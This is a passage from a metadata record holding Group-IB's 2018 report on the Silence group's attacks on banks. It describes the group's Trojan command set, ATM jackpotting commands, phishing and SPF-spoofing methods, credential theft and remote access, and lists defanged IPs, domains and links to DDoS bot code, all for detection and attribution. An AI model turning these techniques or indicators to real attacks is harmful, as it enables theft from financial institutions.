{
    "id": "cd7b7a87-23c7-4bce-954f-51a062495009",
    "created_at": "2022-10-25T16:48:23.899349Z",
    "updated_at": "2025-03-27T02:17:11.766339Z",
    "deleted_at": null,
    "sha1_hash": "ab329ec81cc6bbc20a38b69ae91c1327a390ecd5",
    "title": "Silence: Moving into the darkside",
    "authors": "",
    "file_creation_date": "2019-08-20T21:15:25Z",
    "file_modification_date": "2019-08-21T07:15:16Z",
    "file_size": 6037756,
    "plain_text": "###### September 2018 group-ib.com\n\n##### MOVING INTO THE DARKSIDE\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n\n# TABLE OF CONTENTS\n\n###### Introduction 4\n\n Key findings 5\n\n Silence is a new threat to banks  5\n\n Language 5\n\n Thefts 6\n Geography 6\n\n Tools 7\n\n Initial steps 7\n\n Phishing emails 7\n\n Server infrastructure 8\n\n Silence: the development of tools and types of attacks\b 9\n\n Toolbox 10\n\n Silence 10\n\n Atmosphere 13\n\n Undernet DDoS bot 16\n\n Smoke bot 17\n\n Infection 18\n\n Emails 18\n\n Mail servers 21\n\n Lateral movement 23\n\n Remote Access 25\n\n Targets 26\n\n AWS CBR 26\n\n ATMs 28\n\n Card processing 30\n\n\n-----\n\n###### Hunting СHAPTER IS NOT AVAILABLE\n\n Mail servers —\n\n C&C servers —\n\n Technical description of the tools 32\n\n Attachments 32\n\n Silence Trojan 37\n\n Silence.Downloader 38\n\n Patched Kikothac 40\n\n Silence.MainModule 45\n\n Silence.SurveillanceModule 53\n\n Silence.ProxyBot 54\n\n Silence.ProxyBot.Net 57\n\n Silence ATM pack 60\n\n Atmosphere.Dropper 60\n\n Atmosphere.Injector 62\n\n Atmosphere 62\n\n Other programs 73\n\n Utilities 73\n\n Perl IRC DDoS bot 76\n\n Indicators 81\n\n Hashes 81\n\n E-mails 82\n\n IPs 83\n\n Domains 85\n\n File system artifacts: 86\n\n Suricata rules —\n\n YARA rules —\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n# INTRODUCTION\n\n###### SILENCE is a new and active criminal APT-group, who adapt quickly from their own mistakes and adopt TTPs of other groups.\n\nIn August 2017, the National Bank of Ukraine warned state-owned and private\nbanks across the country about a large-scale phishing attack. The threat actor\nused an exploit from the arsenal of the state-sponsored hacker group APT28.\nHowever, the tool, as Group-IB discovered, was modified to target banks. It also\nappeared that the authors of the phishing emails had in-depth knowledge of\nreverse engineering.\n\nAt the time, the National Bank of Ukraine linked the attack with a new wave of\nNotPetya ransomware outbreak, but these were not pro-government hackers.\nInitial impressions would indicate that the targeted attack was on par with the\nworks of Cobalt or MoneyTaker. This hypothesis went unproven. On investigation,\nthe adversaries were a young and active hacker group, who, like young smart\ntechnical specialists, learned very fast and from their own mistakes.\n\nThe new threat actor group was eventually named Silence. They were identified\nand named first in reports by Anti-Virus vendors, however, until the publication\nof this report, no detailed technical analysis of Silence or their operations has\nbeen conducted.\n\nFinancially motivated APT groups which focus efforts on targeted attacks on the\nfinancial sector such as — Anunak, Corkow, Buhtrap — usually managed botnets\nusing developed or modified banking Trojans. Silence is different. Even at the\nbeginning of their journey, in the summer of 2016, Silence was not able to hack\nbanking systems and actually seemed to learn on the job by carefully analyzing\nthe experiences, tactics and the tools of other groups. They tried new techniques\nto steal from banking systems, including AWS CBR (the Russian Central Bank’s\nAutomated Workstation Client), ATMs, and card processing.\n\nThis report details the results of our investigation, review of attacks and thefts\nby Silence, analysis of their tools, tactics and procedures used to target financial\ninstitutions. This report serves as a contribution to the Whitehat Security\ncommunity from Group-IB and provides technical descriptions of the methods\nand technologies that can be used to detect and track this group. We have\nalso included a detailed analysis of the toolset created by Silence indicators of\ncompromise and other data for successful detection of Silence's attacks.\n\n|SILENCE is a new and active c quickly from their own mista groups.|riminal APT-group, who adapt kes and adopt TTPs of other|\n|---|---|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n# KEY FINDINGS\n\n###### Silence is a new threat to banks\n\nGroup-IB detected the first incidents relating to Silence in June 2016. At that time,\nthe cyber criminals were just beginning to test their capabilities. One of Silence’s\nfirst targets was a Russian bank, when they tried to attack AWS CBR. After this, the\nhackers \"took a moment of silence\". It was later discovered that this is standard\npractice for Silence. They are selective in their attacks and wait for about three\nmonths between incidents, which is approximately three times longer than other\nfinancially motivated APT groups, like MoneyTaker, Anunak (Carbanak), Buhtrap or\nCobalt.\n\nSilence members constantly analyze the experience of other criminal groups. They\ntry to apply new techniques and ways of stealing from various banking systems,\nincluding AWS CBR, ATMs, and card processing. In a short period of time they\nstudied not only direct types of hacking, but also supply-chain attacks. In less\nthan a year, the amount of funds stolen by Silence has increased five times.\n\n###### Language\n\nAs with most financially-motivated APT groups, the members of Silence are\nRussian speakers, which is evidenced by the language of commands, priorities in\nlocating leased infrastructure, the choice of Russian-speaking hosting providers\nand location of the targets.\n\n- The commands of Silence’s Trojan are Russian words typed using an English\nlayout:\n\nhtrjyytrn > реконнект (reconnect)\n\nhtcnfhn > рестарт (restart)\n\nytnpflfybq > нетзадач (notasks)\n\n- The main targets are located in Russia, although phishing emails were sent to\nbank employees in more than 25 countries of Central and Western Europe, Africa\nand Asia.\n\n- To rent servers, Silence uses Russian-speaking hosting providers.\n\n\n-----\n\n###### Thefts\n Timeline of attacks\n\n**July 2016 — A failed attempt to withdraw money via the Russian system of**\ninterbank transactions AWS CBR. Hackers gained access to the system, but the\nattack wasn’t successful due to improper preparation of the payment order. The\nbank’s employees suspended the transaction and conducted Incident Response\nand remediation using their own resources. This resulted in the subsequent\nincident described below:\n\n**August 2016 — Another attempt to attack the same bank. Just one month (!) after**\ntheir failure with AWS CBR, Silence regained access to the servers of the bank\nand attempted another attack. To do this, they downloaded software to secretly\ntake screenshots and proceeded to investigate the operator’s work via video\nstream. This time, the bank asked Group-IB to respond to the incident. The attack\nwas stopped. However, the full log of the incident was unrecoverable, because in\nan attempt to clean the network, the bank’s IT team deleted the majority of the\nattacker’s traces.\n\n**October 2017 — The first successful theft by the group that we know about. This**\ntime, Silence attacked ATMs and stole over $100,000 in just one night. In the same\nyear, they conducted DDoS attacks using the Perl IRC bot and public IRC chats to\ncontrol Trojans.\n\nAfter the failed attempt with the interbank transactions system in 2016, the\ncriminals did not try to withdraw money using the system, even after gaining\naccess to the servers of AWS CBR.\n\n**February 2018 — Successful attack using card processing. They picked up over**\n**$550,000 via ATMs of the bank’s counterpart.**\n\n**April 2018 — In two months, the group returned to their proven method and**\nwithdrew funds again through ATMs. During a single night they siphoned about\n**$150,000. This time, the Silence’s tools had been significantly modified: they were**\nnot burdened with redundant features and ran stably without bugs.\n\n###### Geography\n\nSilence’s successful attacks currently have been limited to the CIS and Eastern\nEuropean countries. Their main targets are located in Russia, Ukraine, Belarus,\nAzerbaijan, Poland, and Kazakhstan.\n\nHowever, some phishing emails were sent to bank employees in more than 25\ncountries of Central and Western Europe, Africa and Asia including: Kyrgyzstan,\nArmenia, Georgia, Serbia, Germany, Latvia, Czech Republic, Romania, Kenya, Israel,\nCyprus, Greece, Turkey, Taiwan, Malaysia, Switzerland, Vietnam, Austria, Uzbekistan,\nGreat Britain, Hong Kong, and others.\n\n\n**RU**\n\n**COM**\n\n\n**OTHERS**\n\n\n**UA**\n\n**BY**\n\n**PL**\n\n\n**ORG**\n\n\n**KZ**\n\n\n**2302**\n\n**96**\n\n**67**\n\n**28**\n\n**17**\n\n**10**\n\n**8**\n\n**8**\n\n\n-----\n\n# TOOLS\n\n###### Initial steps\n\nAccording to Group-IB’s Forensics Laboratory, during the the first attacks Silence\nused third-party tools and learned on the go. However, after some time they\nswitched from using third-party tools to developing their own and significantly\nimproved their tactics.\n\nDuring the first operations the cybercriminals used a third-party patched\nbackdoor Kikothac without access to its source code. They chose a Trojan, which\nhad been known since November 2015, and did not require a lot of time for\nreverse engineering and back end implementation.\n\nThe usage of this disassembled backdoor indicates that the group started without\npreparation and the first operation was a mere attempt to test their capabilities.\n\n###### Development of new tools\n\nLater, the criminals developed a unique set of tools to attack card processing and\nATMs. It included self-developed software:\n\n**• Silence is a framework for attacks on infrastructure.**\n\n**• Atmosphere is a set of software for ‘jackpotting’ ATMs.**\n\n**• Farse is a utility for getting passwords from an infected computer.**\n\n**• Cleaner is a tool for deleting logs of the remote connection.**\n\n**Borrowed tools:**\n\n- Smoke bot is a bot for conducting the first phase of infection.\n\n- Modified Perl IRC DDoS is a bot based on the Undernet DDoS bot for\nconducting DDoS attacks.\n\n###### Phishing emails\n\nAt the beginning, the group used hacked servers and compromised accounts for\ncampaigns, but later the criminals began to register phishing domains and create\nself-signed certificates.\n\nTo evade content filtering systems they used DKIM and SPF. To create ‘legitimate’\nemails purporting to be from the banks, the hackers used the banks’ domains that\ndid not have configured SPF records. The letters were sent from rented servers\nwith substituted technical headers. The attackers created lengthy and logical\ntexts and sent these with the names of bank employees to increase the success\nrate.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nThe emails contained decoy Microsoft Office Word documents weaponized with\nexploits for the CVE-2017-0199, CVE-2017-11882+CVE-2018-0802, CVE-2017-0262,\nand CVE-2018-8174 vulnerabilities. Apart from the exploits, there were emails\nwith attached CHM files, which is not common, and .LNK shortcuts launching\nPowerShell and JavaScript code\n\n###### Remote control and persistence\n\nThe Operator usually conducts the attack using a Linux machine with the WinExe\nutility (the equivalent of PSExec under Linux), which can launch software on the\nremote Windows node via SMB protocol.\n\nAfter it is established on the system, the Silence Trojan installs Meterpreter\nstager. To gain access to compromised computers, the cybercriminals use\n**RAdmin. It is software used by many administrators in banks to remotely control**\nworkstations.\n\n###### Server infrastructure\n\nThe servers rented by the attackers to conduct phishing attacks are located in\n**Russia and the Netherlands. For the C&C servers, they use a Ukrainian hosting**\nprovider that allows placement of practically any content, including banned\ninformation, malicious software and files. Silence rented several servers at\nMaxiDed, whose infrastructure was banned by Interpol in May 2018.\n\n\n-----\n\n-----\n\n###### Silence\nMoving into the darkside\n\n# TOOLBOX\n\nAn important feature of Silence group is the use of their unique self-developed\ntools. Such tools include:\n\n**• Silence, a framework which the group is named after;**\n\n**• Atmosphere pack, a unique set for attacking ATMs;**\n\n**• Farse, a utility for getting passwords from the infected computer;**\n\n**• Cleaner, a tool for deleting logs of the remote connection.**\n\n###### Silence\n\nThe unique Silence framework used by the group is modular. It consists of the\nfollowing components (discovered by us; there could be more):\n\n**• Silence.Downloader loader;**\n\n**• Main module called Silence and a patched backdoor called Kikothac;**\n\n**• Silence.SurveillanceModule, a module for spying on users;**\n\n**• Silence.ProxyBot proxy.**\n\nThe main module can load any other executable file, which does not limit the\nsystem’s functionality and gives room to extend features.\n\nSilence.SurveillanceModule\n\nSilence.ProxyBot\n\nEmail with exploit Silence. Silence or patched Meterpreter\nor script Downloader Kikothac\n\nAfter the attached exploit, disguised as an MS Office document, is opened the\n**Silence.Downloader loader for the Trojan is downloaded and installed. The loader**\nadds itself to startup and waits for the command to download and launch the\nnext stage. If the server is of no interest to the attacker, the bot executes a selfdestruct command.\n\n\n###### Download & Execute\n\n\n###### Registration\n\n\n###### Users Silence C&C\n\n\n-----\n\nThe main body of the Silence Trojan also adds itself to startup after the launch.\nThen it registers on the server and enters command reception/execution loop.\nThe main task of the Trojan is to execute remote commands in the command\ninterpreter as well as download and launch arbitrary programs.\n\nSilence.\nDownloader\n\n\nSilence. Silence\nProxyBot MainModule\n\n\nSilence\nSurveilanceModule\n\n\n**Below is a table of C&C commands that the malware executes:**\n\nCommand Type of command Function\n/ Russian text\n\nhtrjyytrn reconnect Terminate the command interpreter\n\nsession, clear all temporary files, connect to\n\nреконнект\n\nC&C \"from scratch\"\n\nhtcnfhn restart Terminate the command interpreter session\n\nand restart it\n\nрестарт\n\nytnpflfybq notasks No operation\n\nнетзадач\n\n#wget wget Download a file from a remote server and\nsave it in the current directory. Accepts two\nparameters: URL and file name\n\nshell\\n shell Launch the command interpreter\n\n\\n<any other run Execute an arbitrary OS command using the\nstring> command interpreter\n\nTo enter standalone segments of a corporate network, Silence downloads\nthe ProxyBot module. The purpose of this software is to redirect, through an\n\n|Command|Type of command / Russian text|Functio|n|\n|---|---|---|---|\n|htrjyytrn|reconnect реконнект|Termin session C&C \"fr|ate the command interpreter , clear all temporary flies, connect to om scratch\"|\n|htcnfhn|restart рестарт|Termin and res|ate the command interpreter session tart it|\n|ytnpffl ybq|notasks нетзадач|No ope|ration|\n|#wget|wget|Downlo save it parame|ad a flie from a remote server and in the current directory. Accepts two ters: URL and flie name|\n|shell\\n|shell|Launch|the command interpreter|\n|\\n<any other string>|run|Execut comma|e an arbitrary OS command using the nd interpreter|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\ninfected computer, traffic from the external C&C server to the local nodes of the\ncompromised network, which are not accessible from outside. We discovered two\nversions of the program: one in Delphi and one in C#.\n\n\nProxied request\n\n\nRequest command\n\n\nUsers ProxyBot C&C\n\nTo monitor legitimate activity of the victim bank’s users and financial operators,\nthe attackers installed SurveillanceModule, which secretly took screenshots to\ncombine them into a pseudo stream.\n\nAt the last stage of the attack, the bot installed Meterpreter stager into the\nsystem, which automates navigation inside the network.\n\nHaving analyzed the C&C servers we also discovered Kikothac backdoor, which\nwas communicating with one of the Silence servers, 46.183.221[.]89. At first, we\nthought that the software was not connected to Silence’s activity, but the time of\nuploading to the public sandbox HybridAnalysis corresponded with the time of the\nSilence attack. Moreover, the Kikothac sample was uploaded with the same name\nas the Silence Trojan on VirusTotal:\n\nUploded on Hybrid 2016-07-08\npatched Kikothac ProxyBot\n\n\n-----\n\nThrough in-depth analysis, we discovered that the reference to the original\naddress of the C&C server was gone, and the code responsible for connecting to\nthe server, uses the reference to the address which was written over staticallylinked code generated by the compiler:\n\nIn addition, all Kikothac commands begin with the # character, including the\ncommand for downloading files from web servers, #wget. The same command is\nimplemented in the Silence Trojan. This is the only command there that starts with\nthe # character. Any other string not included in the list of Kikothac commands,\nis automatically sent to the command interpreter cmd.exe for execution. Silence\ndoes the very same thing. For example, let’s look at two Kikothac commands\nbelow. The full list of commands is quite long and is provided in the Technical\nDescription of the Tools section:\n\n**Command** **Function**\n\n#wget Download the file to an infected device. Bot accepts two\nparameters: URL and file name.\n\nAny other string Send the string to cmd.exe.\n\nAs we can see, both commands are used in the Silence Trojan. They duplicate the\norder, the type of arguments, and the logic. This suggests that to control patched\n**Kikothac, the threat actors developed back end, which was later used for the**\nSilence Trojan.\n\n###### Atmosphere\n\nTo control the ATM dispenser, Silence uses a unique software called Atmosphere.\nOver time the Trojan has significantly evolved to address the needs of the\ncriminals. For example, the developers have changed the logic of injection into\nprocesses and added the flexible injector, which has expanded the list of targeted\nATMs. They have also removed the redundant features that interrupted the\noperation or were not used by the criminals. For example, the last version of the\nsoftware didn’t process commands from the PIN pad and the generated log got\nsmaller. In the initial stages, the software was recompiled a lot, which resulted in\nseveral unsuccessful cashout attempts.\n\n|Command|Function|Col3|\n|---|---|---|\n|#wget|Download the f parameters: UR|lie to an infected device. Bot accepts two L and flie name.|\n|Any other string|Send the string|to cmd.exe.|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n###### Dropper Injector Atmosphere Dispenser’s process\n\nExtracts\n\nInjects into hardcoded\n\nInjects given into specified\n\nThe hackers remotely install Atmosphere.Dropper on the ATM. The software\ncontains a .DLL library, which is the main body of the Atmosphere Trojan. After\nthe body is extracted, the dropper injects the library into the fwmain32.exe\nprocess. This enables the threat actor to remotely control the dispenser. In the\nfirst versions, there was a way to control the dispenser using the PIN pad, but later\nthese features were deleted.\n\n|Extracts|Col2|Col3|Col4|\n|---|---|---|---|\n|Injects||||\n||Injects given||into specified|\n\n|Command|Function|Col3|\n|---|---|---|\n|\"B\"|Get information on the c string \"cash units info re|ontent of ATM cassettes. In addition, the ceived\" is added into the log.|\n|\"A\"|Get information on the c|ontent of ATM cassettes without logging.|\n|\"Q\"|Get information on the c|ontent of ATM cassettes.|\n|\"D\"|One-time withdrawal of ATM.|notes of the specifci face value from the|\n|\"H\"|Suspend all threads in p GetThreadContext + Set to its own function.|rocess except its own. Then use functions ThreadContext to redirect their execution|\n|\"M\", \"R\", \"S\", \"P\", \"T\", \"L\"|Record the output of th flie. This command is als|e last command into the C:\\intel\\<chrs>.007 o executed after any other by default.|\n\n\n-----\n\nThe program receives commands via files with the specific extension. The\nsoftware reads commands, executes them, and then, as the author intended,\nit should overwrite the file with gibberish and delete it to hamper the work for\nforensics experts. However, the software logic contains an error, which results in\nthe nonsensical text being written at the end of the file instead of over everything.\n\nThis mistake is present in other software used by Silence, which supports the\nhypothesis of a single author. For example, the same piece of code is used in the\nprogram for clearing the connection logs of RAdmin.\n\nAs part of incident response activities in one of the banks, Group-IB forensic\nspecialists discovered about 11 samples of Atmosphere software, compiled at\ndifferent times with slight changes. In one of the directories containing the Trojan\nwe also discovered scripts for the command interpreter and a separate injector,\nwhich accepted a path to the DLL library as an argument, and an identifier of the\nprocess where it should inject the library. However, the scripts passed the target\nprocess name instead of the process identifier, which resulted in an unsuccessful\nattempt to take control over the dispenser.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n###### Undernet DDoS bot\n\nWhile analyzing one of the servers of Silence, we discovered a DDoS bot called\n**Perl IrcBot. On April 20, 2017, phishing emails were sent from the driley123@**\nbellsouth[.]net address. The emails contained an exploit, which downloaded\nSilence.Downloader with the address of C&C server, 92.222.68[.]32, on a machine.\nPerl IrcBot for DDoS attacks was available at hxxp://92.222.68[.]32/bot.pl and\n**hxxp://92.222.68[.]32/wolf/ until June 18, 2018.**\n\n\nSilenсe.Downloader\ncompiled on 2017-04-19\n\n\n2017-04-20\n\n###### http\n\nIRС DDoS bot\nDDoS Perl IrcBotV1.0\nSpanish v ars\n\n#### #\n\n081ee959cbe6bc7dde7a6d13168e4fb4\n\n\n###### http DNS\n#### #\n\nShell\nuploaded to vt on 2017-09-17\n\n###### http DNS\n#### #\n\n\nThe program was first mentioned on a Spanish forum in messages dated 2014:\n**hxxps://forum.voidsec[.]com/thread-93.html. There are also modifications of**\nthe bot available online at: hxxps://github[.]com/H1R0GH057/Anonymous/blob/\n**master/ircabuse.pl and hxxps://gist.github[.]com/dreadpiratesr/7bccc6eed4**\n**9150a8564a. The version used by Silence is based on the Undernet DDoS Bot**\n(second link), according to the unique string \"PRIVMSG : 4,1 [Help]  9,1 Undernet\nPerlBot Main Help:\".\n\n**This software is controlled using IRC messages. There were two servers used:**\n\n1. ira.pubcs16[.]ro, which is a public server of Counter-Strike players via #test\nchannel. Later they used #PMA channel;\n\n2. piratesofcyber[.]tk.\n\n\n-----\n\n###### Smoke Bot\n\nOne of the English-language emails sent in 2017 contained a JavaScript loader\nwhich installed Smoke Bot into the system. Smoke Bot was put up for sale on\nunderground forums in 2011. The seller is a Russian-speaking hacker named\nSmokeLdr. Apart from downloading and execution of arbitrary files, Smoke Bot has\nthe following features:\n\n- collection of credentials from browsers, mail programs and other software;\n\n- collection of email addresses from saved email accounts;\n\n- interception of data input into browser;\n\n- interception of email and FTP passwords in real time;\n\n- ability to collect files with specific criteria;\n\n- DDoS module;\n\n- TeamViewer module;\n\n- cryptocurrency mining module.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n# INFECTION\n\n###### Emails\n\nThe infection vector used by Silence is typical: phishing emails with attachments\ncontaining exploits or malicious scripts. The senders masquerade as bank\nemployees, and while the email lacks design elements (pictures, HTML layout), the\ntext is logical and inspires trust. Unlike, for example, Cobalt phishing emails that\nare created carelessly and rely on their mass nature, Silence emails are tidy and\ntargeted.\n\nFor example, on August 18, 2017, the Central Bank of Ukraine notified\nfinancial institutions about an upcoming ransomware attack (https://www.\n**bankinfosecurity.com/ukraine-central-bank-detects-massive-attack-**\n**preparation-a-10209). We believe that the message was the result of a phishing**\ncampaign by Silence against the banks in Ukraine, Kazakhstan, and Russia.\n\nA unique feature of the campaign is the use of an exploit for the CVE-2017-0262\nvulnerability. The exploit is believed to be owned by the state-sponsored hacker\ngroup APT28. To conduct the campaign, the hackers used a compromised server.\n\nOn May 9, 2017, ESET published a report on the tools of the APT28 group (https://\n**www.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-**\n**trumps-attack-syria-decoy/). The approach to infecting a system and capabilities**\nof attachment from the Silence email correspond to the published report.\nHowever, we discovered the modification of the exploit at the level of assembler\ninstructions or so-called byte patching:\n\n\n-----\n\nThis means that the author didn’t have the source code or the builder, so he had\nto use a fixed jump address. Therefore, the author had to write the payload to the\nfixed address. It is worth noting that to implement such modification one needs\nquite advanced expertise in reverse engineering.\n\nLater, there was a campaign with the CHM file. This is a file extension for compiling\nWindows reference tools. On October 13, 2017, the attackers used names of several\nRussian banks to send phishing emails. One of the emails purported to be from\nthe Russian bank Fin Service. For this attack, the criminals registered a domain,\n**fcbank[.]ru**\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nThis format allows criminals to enable JavaScripts and execute remote VB and/or\nPowershell code by calling mshta.exe or powershell.exe.\n\nAlthough the vector is not new and was used even back in 2015 to deliver malware,\nthe use of CHM files is not at all typical for attacks on the CIS and, in some cases,\nhelps to evade discovery and successfully get through corporate security systems.\n\nOne of the emails was sent to CERT-GIB (Group-IB’s Computer Emergency\nResponse Team):\n\nThe attachment contained an archive with a .LNK shortcut, generated in such way\nthat when opened it launched the Powershell, which downloaded and launched\n**Silence.Downloader. The result of launching the attachment from the Silence**\nemail is the installation of Silence.Downloader on the victim’s computer.\n\nOne of the emails in English contained a JavaScript. The letter purported to be\nfrom Royal Bank of Scotland (stated in footer) with the sender \"HBCL inc\" <info@\nfinamnews019[.]xyz>:\n\nAfter opening the JavaScript the computer downloaded and launched Smoke\n**Bot from the address 91.207.7[.]79, which is a C&C server of Silence. Smoke Bot**\ndownloaded additional modules from the cassocial[.]gdn and variiform[.]gdn\ndomains. The former domain resolved to 91.207.7[.]97. This server, 91.207.7[.]97,\nwas used by Silence to download Silence.Downloader in the email with .LNK.\n\n\n-----\n\n###### Mail Servers\n\nTo send malicious emails, the group utilizes hacked servers and registers\n\"banking\" domains. They also use public mail services, like mail.com and att.net.\n\nIf a bank whose name is used for a campaign, didn’t have correctly configured SPF\nrecords, attackers used a hacked or rented a server to send emails with replaced\nheaders. For example, the following servers were used to send emails with the\nnames of banks without configured SPF:\n\n**IP** **Real Bank** **Service** **Country** **Date**\n**Provider**\n\n5.200.55[.]198 bankrab.ru OOO IT-Grad Russia 07-2016\n\n185.7.30[.]137 itbank.ru VMLAB Russia 06-2017\nLLC VPS\nCustomers\n\nWhen registering new domains for a server from which the emails will be sent, the\nself-signed certificate is released. For more details, please refer to the Hunting\nsection. This way, the email passes the DKIM check. The following domain names\nwere registered using this method:\n\n|IP|Real Bank|Service Provider|Col4|Country|Date|\n|---|---|---|---|---|---|\n|5.200.55[.]198|bankrab.ru|OOO IT-Gr|ad|Russia|07-2016|\n|185.7.30[.]137|itbank.ru|VMLAB LLC VPS Customers||Russia|06-2017|\n\n|Domain|IP|Ser Pro|vice vider|Country|Date|\n|---|---|---|---|---|---|\n|trustintbank[.]org|109.234.34[.]35|VDS Hos|INA VDS ting|Russia|2016-07|\n|itbank[.]us|193.0.178[.]12|PE V|iktor Tyurin|Netherlands|2016-07|\n|itrbank[.]ru|31.31.204[.]161|Reg|.Ru|Russia|2016-09|\n|itmbank[.]ru|185.100.67[.]129|Hos|ter.KZ|Kazakhstan|2016-09|\n|itmbank[.]us|46.30.43[.]83|Euro|byte VPS|Russia|2016-09|\n|mosfni bank[.]ru|5.200.56[.]161|OOO|IT-Grad||2016-09|\n|mostbbank[.]ru|31.31.204[.]161|Reg|.Ru|Russia|2016-09|\n||77.246.145[.]86|E-PL|ANET|Russia|2017-06|\n||77.246.145[.]82||||2017-06|\n|ppfbank[.]ru|185.158.154[.]147|IT-G LLC|RAD 1Cloud|Russia|2017-06|\n|fbank[.]org|185.158.154[.]17|IT-G LLC|RAD 1Cloud|Russia|2017-06|\n||185.154.53[.]132||||2017-06|\n|dgbank[.]ru|158.255.0[.]35|Mir Ltd|Telematiki|Russia|2017-09|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nbankci[.]ru 95.142.39[.]5 Eurobyte VDS\n\n95.142.39[.]6 Eurobyte VDS\n\ncsbank[.]ru 185.180.231[.]63 FirstByte\n\nfcbank[.]ru 195.161.41[.]2 Avguro\nTechnologies\n\n81.177.135[.]99 Ltd. Hosting\n\nservice\nprovider\n\nmmibank[.]ru 81.177.140[.]58 Avguro\nTechnologies\n\n81.177.6[.]226 Ltd. Hosting\n\nservice\nprovider\n\nspas- 185.235.130[.]69 ON-LINE DATA\nibosberbank[.]ru LTD\n\nfpbank[.]ru 217.28.213[.]250 INTRELL-NET\n\n217.28.213[.]162\n\n217.29.57[.]176\n\n**Hacked servers used for sending emails:**\n\n|bankci[.]ru|95.142.39[.]5|Col3|Eurobyte VDS|Russia|2017-09|\n|---|---|---|---|---|---|\n||95.142.39[.]6||Eurobyte VDS|Russia|2017-09|\n|csbank[.]ru|185.180.231[.]63||FirstByte|Russia|2017-09|\n|fcbank[.]ru|195.161.41[.]2||Avguro Technologies Ltd. Hosting service provider|Russia|2017-09|\n||81.177.135[.]99||||2017-10|\n|mmibank[.]ru|81.177.140[.]58||Avguro Technologies Ltd. Hosting service provider|Russia|2017-09|\n||81.177.6[.]226||||2017-10|\n|spas- ibosberbank[.]ru|185.235.130[.]69||ON-LINE DATA LTD|Netherlands|2018-01|\n|fpbank[.]ru|217.28.213[.]250||INTRELL-NET|Russia|2018-05|\n||217.28.213[.]162||||2018-05|\n||217.29.57[.]176||||2018-05|\n\n|Domain|Col2|Date|\n|---|---|---|\n|tvaudio[.]ru||07-2016|\n|vivacity[.]ru||08-2017|\n|fni amnews019[.]xyz||10-2017|\n\n\n-----\n\n# LATERAL MOVEMENT\n\nApart from malware, Silence uses some well-known legitimate utilities to\ncomplete the tasks. For example, to access compromised computers, the group\nuses winexe, which is a Linux utility for remote control of Windows-based\nmachines via SMB protocol. Winexe is an open source project, which is available at\n**https://sourceforge.net/projects/winexe/.**\n\n**To access the machine on Windows with SMB, several conditions must be met:**\n\n- active Server Message Block (SMB) service, which is not blocked by firewall;\n\n- active File and Print Sharing service;\n\n- disabled Simple File Sharing service;\n\n- available Admin$ network resource (hidden SMB object).\n\nTo access Admin$ resource, which is used to launch programs, the program has\nto have credentials: login and password. Upon successful access to the target\n**machine, the c:\\Windows\\winexesvc.exe program is created and launched on the**\n**server using Winexe.**\n\nAfter gaining remote control of the target machine, hackers use Mimikatzbased software and Meterpreter capabilities to download data on user and\nadministrator accounts from the domain.\n\nTo get the computer administrator privileges, LPE exploits are required.\n\nIt was confirmed that they used standalone LPE exploits: CVE-2008-4250, CVE**2017-0143,** and CVE-2017-0263. Other samples were not recoverable. The group\nalso uses all LPE exploits provided by the Metasploit framework.\n\nTo retrieve passwords from RAM, the group used the Farse 6.1 utility, which\nis based on the source code of Mimikatz (hxxps://github[.]com/gentilkiwi/\n**mimikatz). Farse is just an add-on for Mimikatz, which, when launched, extracts**\ncredentials from lsass.exe and prints them to the standard output. In other\nwords, it is software which automates your work with Mimikatz.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n**Farse is developed by Silence. For detailed technical analysis, please refer to the**\nTechnical Description of the Tools section.\n\nHackers used NMAP to scan the corporate network. The tool enabled them to\nbuild network topology and identify vulnerable hosts, which they used to gain\naccess to other machines and administrator accounts.\n\nTo delete RAdmin logs, the group used self-developed software called Cleaner,\nwhich overwrites gibberish in the specified file. The software contains a logical\nerror and the data is added to the end of the document, not overwritten from the\nbeginning. The implementation is copied from Atmosphere.\n\n\n-----\n\n# REMOTE ACCESS\n\nAfter gaining control over the machine (using privilege escalation or a domain\nadministrator account), to further control it, hackers install a remote control tool\ncalled RAdmin. The software is modified in such a way that it works hidden from\nthe user.\n\nAt the same time, together with RAdmin hackers use standard access via RDP.\nTo do so, they patch termsrv.dll. In some cases Silence uses access via WEB RDP\n(which is a standard Windows service) using HTTPS protocol.\n\nTo access the nodes in an internal corporate network that cannot be accessed\nfrom the outside, Silence uses unique software, which allows proxying traffic\nwith backconnect. The first software was written in Delphi. It is classified as\n**Silence.ProxyBot. For a detailed description, please refer to the Technical**\nDescription of the Tools section. After a while, Silence migrated to the version\nof the software for .NET. called Silence.ProxyBot.NET.\n\n\nProxied request\n\n\nRequest command\n\n\nUsers ProxyBot C&C\n\nThus, any computer becomes a proxy with backconnect and intermediate node for\naccessing critical servers in the network.\n\nAfter thorough investigation of the protocol for interaction with the backconnect\nserver, we have developed a software for detecting Silence servers. This data was\nused to detect the infrastructure of the criminal group. The algorithm is described\nin the Hunting section.\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n# TARGETS\n\nThe first incident related to Silence that we know about happened in July 2016.\nHackers tried to withdraw money by manually creating a payment order in the\nsystem of interbank transactions, AWS CBR. However, the payment order was\ncreated incorrectly. The bank’s employees discovered suspicious activity on time\nand took countermeasures using their own resources.\n\nDespite the reaction of the security team and a failed first attempt, the hackers\nrecovered access to the servers of this bank and took a second shot in August\n2016. For this, they downloaded software for secretly taking screenshots and\nproceeded to investigate the operator’s work via a pseudo-video stream.\n\n**In 2017, Silence began to attack ATMs, and this was the first known case of**\nsuccessful money withdrawal. Over one night, the ATMs of one bank spat out over\n**$100,000. In the same year, they conducted DDoS attacks using the Perl IRC bot**\nand public IRC chats to control Trojans.\n\n**In 2018, hackers attacked via card processing. They successfully withdrew over**\n**$550,000 in one weekend through the ATMs of the bank’s partner.**\n\nIn April 2018, the group returned to the proven method and withdrew funds again\nthrough ATMs. During a single night they siphoned about $150,000.\n\n###### AWS CBR\n\nAt the moment of the Incident Response to the first attack in 2016, the shared\ndirectory, where payment batches for AWS CBR were uploaded, was accessible\nfrom workstations of 2 employees. They worked with correspondent accounts,\nso these were the server with the 